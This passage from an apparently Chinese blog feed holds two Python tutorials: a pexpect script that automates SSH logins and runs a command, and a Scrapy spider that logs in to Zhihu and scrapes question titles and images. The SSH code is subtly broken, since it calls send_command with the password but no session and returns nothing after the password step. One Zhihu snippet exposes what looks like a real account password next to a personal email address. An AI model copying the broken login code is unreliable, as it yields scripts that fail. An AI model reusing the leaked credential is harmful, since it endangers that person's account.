<h5 id="toc_1">功能模块分解</h5>

<ol>
<li><p>首先我们需要一个可以单独的session会话，可以由connect函数创建指定host,username和password的会话子进程</p>

<pre><code>```Python
PROMPT = [&#39;#&#39;,&#39;$&#39;,&#39;&gt;&#39;,&#39;\$&#39;,&#39;&gt;&gt;&gt;&#39;]
def createChildSession(host,username,password):
    command = &#39;ssh &#39;+username+&#39;@&#39;+host
    child = pexpect.spawn(command)
    ret = child.expect([pexpect.TIMEOUT,&#39;Are you sure you want to continue connecting&#39;,&#39;[P|p]assword&#39;]+PROMPT)
    if ret == 0:
        print(&#39;[-] Error Connecting&#39;)
        return
    if ret == 1:
        child.sendline(&#39;yes&#39;)
        ret = child.expect([pexpect.TIMEOUT,&#39;[p|P]assword&#39;])
        if ret == 0:
            print(&#39;[-] Error Connecting&#39;)
            return
        if ret == 1:
            send_command(password)
            return
    if ret == 2:
        send_command(password)
        return
    return child
```
利用spawn创建会话之后,利用expect匹配可能存在的返回结果,如果匹配&#39;Are you sure you want to continue connecting&#39; 说明需要确认认证信息，如果直接返回password或者Password`这里利用[p|P]assword正则来匹配`,说明需要输入密码,如果直接是PROMPT中存在的字符，说明直接登录上去了。
</code></pre></li>
<li><p>一个单独的执行命令的函数:</p>

<pre><code class="language-Python">def send_command(child,cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)
</code></pre>

<p>一旦通过验证,我们就可以用上面的command函数在ssh会话中发送命令，然后等待命令提示符的出现，最后将命令的执行结果通过child.before打印出来。</p></li>
<li><p>一个包含参数解析的main函数:</p>

<pre><code class="language-Python">def main():
    parse = optparse.OptionParser(&#39;Usage %prog -H &lt;host&gt; -u &lt;username&gt; -p &lt;password&gt; -c &lt;command&gt;&#39;)
    parse.add_option(&#39;-H&#39;,dest=&#39;host&#39;,type=&#39;string&#39;,help=&#39;specify the host&#39;)
    parse.add_option(&#39;-u&#39;,dest=&#39;username&#39;,type=&#39;string&#39;,help=&#39;specify the username&#39;)
    parse.add_option(&#39;-p&#39;,dest=&#39;password&#39;,type=&#39;string&#39;,help=&#39;specify the password&#39;)    
    parse.add_option(&#39;-c&#39;,dest=&#39;command&#39;,type=&#39;string&#39;,help=&#39;specify the command&#39;)

    (options,args)=parse.parse_args()
    host = options.host
    username = options.username
    password = options.password
    command = options.command

    session = createChildSession(host,username,password)
    send_command(session,command)
</code></pre>

<p>optparse是一个用来给你的代码添加各种命令参数的库，用其解析出输入的host,username,password已经command,然后调用创建session会话，最后利用send_command向此session发送命令</p></li>
</ol>

<pre><code class="language-Bash">tianxianggendeiMac:Python-Study Apple$ python ssh.py -H pi.****.com -u root -p ***** -c pwd
</code></pre>

<p>输出:</p>

<pre><code class="language-Bash"> pwd
/root
root@raspberrypi:~
</code></pre>

<h5 id="toc_2">完整代码</h5>

<pre><code class="language-Python">#!/usr/bin/python
#-*-coding:utf-8-*-
# date:2016-6-21
# author:root
# 利用pexpect模拟ssh登陆

import pexpect
import optparse

PROMPT = [&#39;#&#39;,&#39;$&#39;,&#39;&gt;&#39;,&#39;\$&#39;,&#39;&gt;&gt;&gt;&#39;]

def send_command(child,cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)

def createChildSession(host,username,password):
    command = &#39;ssh &#39;+username+&#39;@&#39;+host
    child = pexpect.spawn(command)
    ret = child.expect([pexpect.TIMEOUT,&#39;Are you sure you want to continue connecting&#39;,&#39;[P|p]assword&#39;]+PROMPT)
    if ret == 0:
        print(&#39;[-] Error Connecting&#39;)
        return
    if ret == 1:
        child.sendline(&#39;yes&#39;)
        ret = child.expect([pexpect.TIMEOUT,&#39;[p|P]assword&#39;])
        if ret == 0:
            print(&#39;[-] Error Connecting&#39;)
            return
        if ret == 1:
            send_command(password)
            return
    if ret == 2:
        send_command(password)
        return
    return child

def main():
    parse = optparse.OptionParser(&#39;Usage %prog -H &lt;host&gt; -u &lt;username&gt; -p &lt;password&gt; -c &lt;command&gt;&#39;)
    parse.add_option(&#39;-H&#39;,dest=&#39;host&#39;,type=&#39;string&#39;,help=&#39;specify the host&#39;)
    parse.add_option(&#39;-u&#39;,dest=&#39;username&#39;,type=&#39;string&#39;,help=&#39;specify the username&#39;)
    parse.add_option(&#39;-p&#39;,dest=&#39;password&#39;,type=&#39;string&#39;,help=&#39;specify the password&#39;)    
    parse.add_option(&#39;-c&#39;,dest=&#39;command&#39;,type=&#39;string&#39;,help=&#39;specify the command&#39;)

    (options,args)=parse.parse_args()
    host = options.host
    username = options.username
    password = options.password
    command = options.command
    
    session = createChildSession(host,username,password)
    send_command(session,command)

if __name__ == &#39;__main__&#39;:
    main()
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Scrapy模拟登陆知乎]]></title>
    <link href="https://blog.mylonly.com/14945011328774.html"/>
    <updated>2017-05-11T19:12:12+08:00</updated>
    <id>https://blog.mylonly.com/14945011328774.html</id>
    <content type="html"><![CDATA[
<p><img src="https://pic.mylonly.com/2016-06-29_14645998164473.jpg" alt="2016-06-29_14645998164473.jpg"/><br/>
感谢简书作者<code>Andrew_liu</code>提供的思路,虽然知乎改版后，该文章上提供的方法已经失效<a href="http://www.jianshu.com/p/b7f41df6202d">Python爬虫(七)--Scrapy模拟登录<br/>
</a></p>

<p>利用Scrapy提供的cookie中间价很容易做到网页的模拟登陆,下面就来介绍怎么利用这个cookie中间件来登陆知乎。</p>

<h3 id="toc_0">前期分析工作</h3>

<ul>
<li><p>打开<a href="https://www.zhihu.com,%E5%88%A9%E7%94%A8Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84Debug%E5%8A%9F%E8%83%BD%EF%BC%8C%E5%AE%9A%E4%BD%8D%E5%88%B0%E7%99%BB%E9%99%86%E6%A1%86%E6%89%80%E5%9C%A8%E7%9A%84%E4%BD%8D%E7%BD%AE%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA">https://www.zhihu.com,利用Chrome浏览器的Debug功能，定位到登陆框所在的位置，如下图所示</a><br/>
<img src="https://pic.mylonly.com/2016-06-29_14645980407304.jpg" alt="2016-06-29_14645980407304.jpg"/><br/>
利用scrapy提供的xpath能很方便的获取到这个值(//div[@data-za-module=&quot;SignInForm&quot;]//form//input[@name=&quot;_xsrf&quot;]/@value&#39;)</p></li>
<li><p>选中Debug窗口的Network选项，同时在输完账号密码后点击登陆，获取登陆操作后的post请求，见下图:</p></li>
</ul>

<p><img src="https://pic.mylonly.com/2016-06-29_14645982403637.jpg" alt="2016-06-29_14645982403637.jpg"/><br/>
点击这个链接，确认这个链接就是提交登陆的url<br/>
<img src="https://pic.mylonly.com/2016-06-29_14645983258011.jpg" alt="2016-06-29_14645983258011.jpg"/><br/>
从FormData里面可以看到<a href="https://www.zhihu.com/email/login%E5%B0%B1%E6%98%AF%E7%99%BB%E9%99%86POST%E8%AF%B7%E6%B1%82%E7%9A%84url%EF%BC%8C%E9%9C%80%E8%A6%81%E6%8F%90%E4%BA%A44%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E5%85%B6%E4%B8%AD_xsrf%E5%B0%B1%E6%98%AF%E9%A6%96%E9%A1%B5%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E5%88%B0%E7%9A%84%E9%9A%90%E8%97%8F%E8%A1%A8%E5%8D%95%E5%8F%82%E6%95%B0%EF%BC%8Cremember_me%E6%98%AF%E6%98%AF%E5%90%A6%E8%AE%B0%E4%BD%8Fcookie%E7%9A%84%E5%BC%80%E5%85%B3%EF%BC%8Cemail%E5%92%8Cpassword%E5%AF%B9%E5%BA%94%E8%B4%A6%E5%8F%B7%E5%92%8C%E5%AF%86%E7%A0%81">https://www.zhihu.com/email/login就是登陆POST请求的url，需要提交4个参数，其中_xsrf就是首页可以获取到的隐藏表单参数，remember_me是是否记住cookie的开关，email和password对应账号和密码</a></p>

<blockquote>
<p>此处可能有不一样的地方，因为我的知乎账号是email注册的，根据这个url的特征推测别的账号类型可能存在不一样的Url</p>
</blockquote>

<h3 id="toc_1">编写蜘蛛代码</h3>

<p>1.继承CrawlSpider,并重写spider的start_request方法，让spier先访问登录页再去爬取start_urls中的链接，在start_requests方法中，让spider先去访问知乎首页，去获取隐藏的表单项<code>_xsrf</code></p>

<pre><code class="language-Python">def start_requests(self):
        return [Request(&quot;https://www.zhihu.com/&quot;,headers = self.headers,meta={&quot;cookiejar&quot;:1},callback=self.post_login)]
</code></pre>

<p>其中header需要自定义，因为知乎对spider做了限制，应该是检测User-Agent，你可以在setting.py中更改spider的默认UserAgent,也可以像我这样自己自定义一个</p>

<pre><code class="language-Pythoh">headers = {
    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;,
    &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot;,
    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.8,zh-TW;q=0.6,zh;q=0.4&quot;,
    &quot;Connection&quot;: &quot;keep-alive&quot;,
    &quot;Content-Type&quot;:&quot; application/x-www-form-urlencoded; charset=UTF-8&quot;,
    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36&quot;,
    &quot;Referer&quot;: &quot;http://www.zhihu.com&quot;
}
</code></pre>

<p>meta中的cookiejar是Scrapy的Cookie中间件的关键字，具体可参考scrapy文档，这里因为只需要保存一个cookie，所以直接写1(注意:<code>并不是1个cookie才写的1，仅仅是个key，后面通过这个1这个key找到cookiejar中保存的cookie</code>)</p>

<p>2.解析首页内容，获取到_xsrf的值，同时提交登录请求:</p>

<pre><code class="language-Python">def post_login(self,response):
        self.log(&quot;preparing login...&quot;)
        xsrf = Selector(response).xpath(&#39;//div[@data-za-module=&quot;SignInForm&quot;]//form//input[@name=&quot;_xsrf&quot;]/@value&#39;).extract()[0]
        self.log(xsrf)
        return FormRequest(&quot;https://www.zhihu.com/login/email&quot;,meta={&#39;cookiejar&#39;:1},
                                          headers = self.headers,
                                          formdata = {
                                             &#39;_xsrf&#39;:xsrf,
                                             &#39;password&#39;:&#39;xgBKQTx7VnVLK9tv&#39;,
                                             &#39;email&#39;:&#39;tianxianggen@gmail.com&#39;,
                                             &#39;remember_me&#39;:&#39;true&#39;,
                                          },
                                          callback = self.after_login,
                                          )
</code></pre>

<ol>
<li>将登录成功后获取到的cookie传递给每一个start_urls中链接的ruquest</li>
</ol>

<pre><code class="language-Python">def after_login(self,response):
        for url in self.start_urls:
            yield Request(url,meta={&#39;cookiejar&#39;:1},headers = self.headers)
</code></pre>

<p>4.由于cookiejar中的cookie并不会自动发送给每个链接，因此在urls通过Rule获取到的连接，也是需要我们手动将cookie加上，通过Rule提供的process_request参数重新创建带cookie的Request</p>

<pre><code class="language-Pythoh">rules = (
        Rule(SgmlLinkExtractor(allow=(&#39;/question/\d*&#39;)),process_request=&quot;request_question&quot;),
    )
</code></pre>

<p>同时提供request_question函数</p>

<pre><code class="language-Python">def request_question(self,request):
        return Request(request.url,meta={&#39;cookiejar&#39;:1},headers = self.headers,callback=self.parse_question)
</code></pre>

<p>5.由于已经有了process_link ,Rule中的callback参数就不再起作用了，而是调用新构造的Request中的callback函数。</p>

<pre><code class="language-Python">def parse_question(self,response):
        sel = Selector(response)
        item = zhihuItem()
        item[&#39;qestionTitle&#39;] = sel.xpath(&quot;//div[@id=&#39;zh-question-title&#39;]//h2/text()&quot;).extract_first()
        item[&#39;image_urls&#39;] = sel.xpath(&quot;//img[@class=&#39;origin_image zh-lightbox-thumb lazy&#39;]/@data-original&quot;).extract()
        return item
</code></pre>

<blockquote>
<p>这个parse_question方法仅仅是获取问题名称和问题下面的所有图片链接。</p>
</blockquote>

<h3 id="toc_2">完整代码</h3>

<pre><code class="language-Python">import urllib2
import os
import re
import codecs


from scrapy.contrib.spiders import CrawlSpider,Rule
from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor
from scrapy.selector import Selector
from MySpider.items import zhihuItem
from scrapy.http import Request
from scrapy.http import FormRequest
from scrapy.utils.response import open_in_browser


class zhihuSpider(CrawlSpider):
    name = &quot;zhihu&quot;
    allow_domians = [&quot;zhihu.com&quot;]
    start_urls = [&quot;https://www.zhihu.com/collection/38624707&quot;]
    rules = (
        Rule(SgmlLinkExtractor(allow=(&#39;/question/\d*&#39;)),process_request=&quot;request_question&quot;),
    )
    
    headers = {
    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;,
    &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot;,
    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.8,zh-TW;q=0.6,zh;q=0.4&quot;,
    &quot;Connection&quot;: &quot;keep-alive&quot;,
    &quot;Content-Type&quot;:&quot; application/x-www-form-urlencoded; charset=UTF-8&quot;,
    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36&quot;,
    &quot;Referer&quot;: &quot;http://www.zhihu.com&quot;
    }
    
    def start_requests(self):
        return [Request(&quot;https://www.zhihu.com/&quot;,headers = self.headers,meta={&quot;cookiejar&quot;:1},callback=self.post_login)]
        
    def post_login(self,response):
        self.log(&quot;preparing login...&quot;)
        xsrf = Selector(response).xpath(&#39;//div[@data-za-module=&quot;SignInForm&quot;]//form//input[@name=&quot;_xsrf&quot;]/@value&#39;).extract()[0]
        self.log(xsrf)
        return FormRequest(&quot;https://www.zhihu.com/login/email&quot;,meta={&#39;cookiejar&#39;:response.meta[&#39;cookiejar&#39;]},
                                          headers = self.headers,
                                          formdata = {
                                             &#39;_xsrf&#39;:xsrf,
                                             &#39;password&#39;:&#39;差点就忘了删了&#39;,
                                             &#39;email&#39;:&#39;邮箱也不能暴露&#39;,
                                             &#39;remember_me&#39;:&#39;true&#39;,
                                          },
                                          callback = self.after_login,
                                          )
                                                      
    def after_login(self,response):
        for url in self.start_urls:
            yield Request(url,meta={&#39;cookiejar&#39;:1},headers = self.headers)
   
    def request_question(self,request):
        return Request(request.url,meta={&#39;cookiejar&#39;:1},headers = self.headers,callback=self.parse_question)
        
    def parse_question(self,response):
        sel = Selector(response)
        item = zhihuItem()
        item[&#39;qestionTitle&#39;] = sel.xpath(&quot;//div[@id=&#39;zh-question-title&#39;]//h2/text()&quot;).extract_first()
        item[&#39;image_urls&#39;] = sel.xpath(&quot;//img[@class=&#39;origin_image zh-lightbox-thumb lazy&#39;]/@data-original&quot;).extract()
        return item
</code></pre>

]]></content>
  </entry>
  
</feed>
